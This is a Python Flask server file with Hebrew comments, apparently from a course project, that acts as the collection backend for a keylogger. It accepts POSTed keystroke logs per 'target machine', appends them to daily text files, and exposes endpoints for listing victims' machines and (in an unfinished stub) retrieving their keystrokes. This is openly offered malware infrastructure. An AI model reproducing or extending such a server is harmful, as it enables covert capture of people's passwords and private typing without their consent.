
import time
from flask import Flask, jsonify ,request
import os
from pathlib import Path
from flask_cors import CORS

# הפעלת השרת
app = Flask(__name__)

#את השורה הבאה רק אם חייבים
CORS(app)  # Enable CORS for all routes

#main
@app.route('/' , methods = ['GET'])
def main():
    return "KeyLogger Server is Running"

# מתודות שונות

# מחזיר שם קובץ המבוסס על חותמת זמן
def generate_log_filename() -> str:
    # מחזירה שם קובץ המבוסס על חותמת זמן #
    # return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
    return "log_" + time.strftime("%Y-%m-%d") + ".txt" #רק תאריך - שישתנה txt פעם ביום

# מתודה שמחפשת תיקיות בדווקא בתוך מערכת הקבצים ומחזירה ליסט של שמות הקבצים
def check_folder_contents(folder_path,flag) -> list:
    # קבלת פרמטר נתיב עד לכאן
    folder = Path(folder_path)

    #  וולידציה כללית - אם לא קיימת התיקייה
    if not folder.exists():
        return ["error"] # "התיקייה לא קיימת."

    #בתוך התוכנית :
    contents = list(folder.iterdir())  # מקבל את כל הקבצים והתיקיות באותו נתיב
    # בודק אם התיקייה עצמה ריקה
    if not contents:
        return ["is empty"] # "התיקייה ריקה."

    if flag == 'document':
        #סינון קבצים בלבד
        #files = [item for item in folder.iterdir() if item.is_file()]
        files = []
        for item in contents:
            if item.is_file():
                if item.name[-3:] == ".txt": # בודק אם 4 אותיות אחרונות הן .txt
                    files.append(item.name)
        if files:
            return files
        else:
            return ['empty']

    if flag == "file":
        # סינון תיקיות בלבד
        # קוד קצר
        # folders = [item.name for item in contents if item.is_dir()]
        folders = []
        for item in contents:
            if item.is_dir():
                folders.append(item.name)
        # קוד קצר
        # return folders if folders else "אין תיקיות בתוך התיקייה."
        if folders:
            return folders
        return ["empty"] # "אין תיקיות בתוך התיקייה."

#בקשת POST
@app.route('/api/upload', methods=['POST'])
def upload():
    # א. בדיקה אם המחשב קיים (או שזה בapiאחר)
    # ב. במידה וקיים תמצא את הקובץ טקסט
    # ג. אם לא קיים תיצור קובץ טקסט ותכניס אליו

    #טוען את הנתונים לתוך data
    data = request.get_json()

    # מה שהם רוצים בעצם שיהיה בדיקשינרי חלק של "mechine" וחלק של "data" ככה שישלח לשרת
    #גם machin וגם data
    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    #יצירת משתנה של מערכת הקבצים עד עכשיו
    data_folder = 'C:\KeyLogger_kodkode\Server\data'

    machine = data["machine"]
    log_data = data["data"]

    # data folder - הכוונה למיקום שלהם במערכת

    # יצירת תיקיה עבור המכשיר במידה ואינה קיימת

    # מסדר את הנתיב לקובץ בצורה מיטבית
    machine_folder = os.path.join(data_folder, machine)
    # שאלה האם התיקייה הזאת נמצאת
    if not os.path.exists(machine_folder):
        #יצירת תיקייה
        os.makedirs(machine_folder)
    # קטע הרחבה: אם רוצים לאסוף בזמן אמת את ההתחברות של המחשבים החדשים אפשר להגדיר את זה פה


    # יצירת קובץ txt חדש לפי חותמת זמן (המתודה שהוגדר למעלה)

    # יצירת שם הקובץ עפ"י תאריך
    filename = generate_log_filename()
    # סידור הנתיב מחדש
    file_path = os.path.join(machine_folder, filename)
    if not os.path.exists(file_path):
        #הכנסה של הערך החדש ויצירת קובץ txt
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(log_data)
    else:
        # הכנסה של הערך החדש ועידכונו בתוך הקובץ הקיים
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(log_data)

    # ההחזרה בסוף
    return jsonify({"status": "success", "file": file_path}), 200



# כרגע נצא מתוך נקודת הנחה שלא צריך פרמטר של שעה מכיוון שברגע שנשלח פרמטר של מחשב - מביא את כל ההדפסות
@app.route('/api/<upload_value>', methods=['GET'])
def get_data(upload_value):

    # קבלת פרמטרים
    data_param_machin = request.args.get('machin')
    data_param_time = request.args.get('time')


        # return jsonify({"error": "Invalid payload"}), 400

    if upload_value == "get_target_machines_list":
        list_machin = get_target_machines_list()
        # ההחזרה בסוף
        return jsonify({"status": "success", "data": list_machin}), 200
    elif upload_value == "get_target_machines_key_strokes":
        get_target_machines_key_strokes(data_param_machin)

#תייצא את רשימת המחשבים
def get_target_machines_list() ->list:
    # הגדרת הנתיב
    data_folder = 'C:\KeyLogger_kodkode\Server\data'
    #הוצאה של שמות התיקיות
    list_machine = check_folder_contents(data_folder,"file")
    return list_machine

# תייבא לי את ההקלדות לאותו מחשב
# במידה ויש רצון ל- time מסוים בבקשה-נעביר את זה דרך time
def get_target_machines_key_strokes(name_machin,param_time=None):
    data_folder = 'C:\KeyLogger_kodkode\Server\data'
    list_machine = check_folder_contents(data_folder, "document")
    for item in list_machine:

        pass




# סוף התוכנית, ותחילת טעינתה
if __name__ == '__main__':
     app.run(debug=True)




